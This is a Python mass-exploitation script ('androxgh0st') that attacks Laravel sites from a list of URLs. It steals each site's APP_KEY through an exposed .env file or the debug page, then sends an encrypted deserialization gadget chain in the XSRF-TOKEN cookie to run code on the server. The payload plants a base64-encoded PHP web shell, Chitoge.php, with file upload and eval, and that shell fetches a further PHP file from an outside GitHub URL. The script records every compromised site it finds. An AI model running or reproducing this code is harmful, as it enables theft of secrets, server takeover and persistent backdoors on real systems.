# -*- coding: utf-8 -*-
''' So many people who love you. Don't focus on the people who don't. xD '''

import hmac, hashlib, json, requests, re, threading, time, random, sys, os
requests.packages.urllib3.disable_warnings()
from hashlib import sha256
from base64 import b64decode
from base64 import b64encode
from Crypto import Random
from Crypto.Cipher import AES

# Payload configure
p = '<?php $root = $_SERVER["DOCUMENT_ROOT"]; $myfile = fopen($root . "/Chitoge.php", "w") or die("Unable to open file!"); $code = "PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwoKaWYoaXNzZXQoJF9HRVRbIkNoaXRvZ2UiXSkpIHsKICAgIGVjaG8gIjxoMT48aT5DaGl0b2dlIGtpcmlzYWtpIDwzPC9pPjwvaDE+PGJyPiI7CiAgICBlY2hvICI8Yj48cGhwdW5hbWU+Ii5waHBfdW5hbWUoKS4iPC9waHB1bmFtZT48L2I+PGJyPiI7CiAgICBlY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPgogICAgICAgICAgPGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J2lkeF9maWxlJz4KICAgICAgICAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3VwbG9hZCcgdmFsdWU9J3VwbG9hZCc+CiAgICAgICAgICA8L2Zvcm0+IjsKICAgICRyb290ID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsKICAgICRmaWxlcyA9ICRfRklMRVNbJ2lkeF9maWxlJ11bJ25hbWUnXTsKICAgICRkZXN0ID0gJHJvb3QuJy8nLiRmaWxlczsKICAgIGlmKGlzc2V0KCRfUE9TVFsndXBsb2FkJ10pKSB7CiAgICAgICAgaWYoaXNfd3JpdGFibGUoJHJvb3QpKSB7CiAgICAgICAgICAgIGlmKEBjb3B5KCRfRklMRVNbJ2lkeF9maWxlJ11bJ3RtcF9uYW1lJ10sICRkZXN0KSkgewogICAgICAgICAgICAgICAgJHdlYiA9ICJodHRwOi8vIi4kX1NFUlZFUlsnSFRUUF9IT1NUJ107CiAgICAgICAgICAgICAgICBlY2hvICJTdWtzZXMgLT4gPGEgaHJlZj0nJHdlYi8kZmlsZXMnIHRhcmdldD0nX2JsYW5rJz48Yj48dT4kd2ViLyRmaWxlczwvdT48L2I+PC9hPiI7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBlY2hvICJnYWdhbCB1cGxvYWQgZGkgZG9jdW1lbnQgcm9vdC4iOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYoQGNvcHkoJF9GSUxFU1snaWR4X2ZpbGUnXVsndG1wX25hbWUnXSwgJGZpbGVzKSkgewogICAgICAgICAgICAgICAgZWNobyAic3Vrc2VzIHVwbG9hZCA8Yj4kZmlsZXM8L2I+IGRpIGZvbGRlciBpbmkiOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgZWNobyAiZ2FnYWwgdXBsb2FkIjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfSBlbHNlaWYoaXNzZXQoJF9HRVRbIktpcmlzYWtpIl0pKXsKCSRob21lZSA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107CgkkY2dmcyA9IGV4cGxvZGUoIi8iLCRob21lZSk7CgkkYnVpbGQgPSAnLycuJGNnZnNbMV0uJy8nLiRjZ2ZzWzJdLicvLmNhZ2Vmcyc7CglpZihpc19kaXIoJGJ1aWxkKSkgewoJCWVjaG8oIkNsb3VkTGludXggPT4gVHJ1ZSIpOwoJfSBlbHNlIHsKCQllY2hvKCJDbG91ZExpbnV4ID0+IEZhbHNlIik7Cgl9Cn0gZWxzZWlmIChpc3NldCgkX0dFVFsnR29yaWxhJ10pKSB7CglldmFsKGJhc2U2NF9kZWNvZGUoJ1puVnVZM1JwYjI0Z1lXUnRhVzVsY2lna2RYSnNMQ0FrYVhOcEtTQjdDaUFnSUNBZ0lDQWdKR1p3SUQwZ1ptOXdaVzRvSkdsemFTd2dJbmNpS1RzS0lDQWdJQ0FnSUNBa1kyZ2dQU0JqZFhKc1gybHVhWFFvS1RzS0lDQWdJQ0FnSUNCamRYSnNYM05sZEc5d2RDZ2tZMmdzSUVOVlVreFBVRlJmVlZKTUxDQWtkWEpzS1RzS0lDQWdJQ0FnSUNCamRYSnNYM05sZEc5d2RDZ2tZMmdzSUVOVlVreFBVRlJmUWtsT1FWSlpWRkpCVGxOR1JWSXNJSFJ5ZFdVcE93b2dJQ0FnSUNBZ0lHTjFjbXhmYzJWMGIzQjBLQ1JqYUN3Z1ExVlNURTlRVkY5U1JWUlZVazVVVWtGT1UwWkZVaXdnZEhKMVpTazdDaUFnSUNBZ0lDQWdZM1Z5YkY5elpYUnZjSFFvSkdOb0xDQkRWVkpNVDFCVVgxTlRURjlXUlZKSlJsbFFSVVZTTENCbVlXeHpaU2s3Q2lBZ0lDQWdJQ0FnWTNWeWJGOXpaWFJ2Y0hRb0pHTm9MQ0JEVlZKTVQxQlVYMFpKVEVVc0lDUm1jQ2s3Q2lBZ0lDQWdJQ0FnY21WMGRYSnVJR04xY214ZlpYaGxZeWdrWTJncE93b2dJQ0FnSUNBZ0lHTjFjbXhmWTJ4dmMyVW9KR05vS1RzS0lDQWdJQ0FnSUNCbVkyeHZjMlVvSkdad0tUc0tJQ0FnSUNBZ0lDQnZZbDltYkhWemFDZ3BPd29nSUNBZ0lDQWdJR1pzZFhOb0tDazdDbjBLYVdZb1lXUnRhVzVsY2lnbmFIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDJGdVpISnZlR2RvTUhOMEwycDFjM1F0Wm05eUxXWjFiaTl0WVhOMFpYSXZkM0F1Y0dod0p5d25kM0F1Y0dod0p5a3BJSHNLSUNBZ0lDQWdJQ0JsWTJodklDSjNhV0oxYUdWclpYSXViM0puSWpzS2ZTQmxiSE5sSUhzS0lDQWdJQ0FnSUNCbFkyaHZJQ0pzYjJOaGJHaHZjM1FpT3dwOScpKTsKfSBlbHNlIHsKICAgIGhlYWRlcignSFRUUC8xLjEgNDAzIEZvcmJpZGRlbicpOwp9Cj8+"; fwrite($myfile, base64_decode($code)); fclose($myfile); echo("Chitoge kirisaki?! Tsundere,kawaii <3"); ?>'
exploit_code = 'O:29:"Illuminate\Support\MessageBag":2:{s:11:"' + "\x00" + '*' + "\x00" + 'messages";a:0:{}s:9:"' + "\x00" + '*' + "\x00" + 'format";O:XMR:"Illuminate\Bus\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' + "\x00" + '*' + "\x00" + 'name";s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:' + str(len(p)) + ':"' + p + '";}}}}'

# Preparing
BLOCK_SIZE = 16
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

class androxgh0st:
    ''' There is no failure except in no longer trying. xD '''
    def encrypt(self, raw, key):
        raw = pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        rawco = cipher.encrypt(raw)
        mac = hmac.new(key, b64encode(iv)+b64encode(rawco), hashlib.sha256).hexdigest()
        value = b64encode(rawco)
        iv = b64encode(iv)
        data = {}
        data['iv'] = str(iv)
        data['value'] = str(value)
        data['mac'] = str(mac)
        json_data = json.dumps(data)
        return  json_data

    def get_env(self, text, url):
        #headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        #text = requests.get(url+"/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
        if "APP_KEY" in text:
            if "APP_KEY=" in text:
                appkey = re.findall("APP_KEY=([a-zA-Z0-9:;\/\\=$%^&*()-+_!@#]+)", text)[0]
            else:
                #text = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
                if "<td>APP_KEY</td>" in text:
                    appkey = re.findall("<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
            if appkey:
                if '"' in appkey or "'" in appkey:
                    appkey = appkey[1:-1]
                return appkey
            else:
                return False
        else:
            return False

def printf(text):
    ''.join([str(item) for item in text])
    print(text + '\n'),

def exploit(url):
    asu = url
    resp = False
    try:
        text = '\033[32;1m#\033[0m '+url
        headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_source = requests.get(url+"/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
        if "APP_KEY=" in get_source:
            resp = get_source
        else:
            get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
            if "<td>APP_KEY</td>" in get_source:
                resp = get_source
        if resp:
            getkey = androxgh0st().get_env(resp, url)
            if getkey:
                api_key = getkey.replace('base64:', '')
                key = b64decode(api_key)
                xnxx = androxgh0st().encrypt(exploit_code, key)
                matamu = b64encode(str(xnxx))
                cokk = {"XSRF-TOKEN": matamu}
                curler = requests.get(url+'/public/', cookies=cokk, verify=False, timeout=8, headers=headers).text
                y = curler.split("</html>")[1]
                cekshell = requests.get(url + '/Chitoge.php?Chitoge', verify=False, timeout=8, headers=headers).text
                if 'Chitoge kirisaki' in cekshell:
                    text += " | Success"
                    save = open('shell_results.txt','a')
                    save.write(url + '/Chitoge.php?Chitoge\n')
                    save.close()
                else:
                    text += " | Can't exploit"
            else:
                text += " | Can't get APP_KEY"
        else:
            text += " | Can't get APP_KEY using .env or debug mode"
    except KeyboardInterrupt:
        exit()
    except Exception as err:
        text += " | Error: "+str(err)
    printf(text)

lists = sys.argv[1]
asu = open(lists).read()
for site in asu.splitlines():
    if "://" in site:
        site = site
    else:
        site = "http://"+site
    try:
        exploit(site)
    except KeyboardInterrupt:
        exit()
    except Exception as err:
        print(str(err))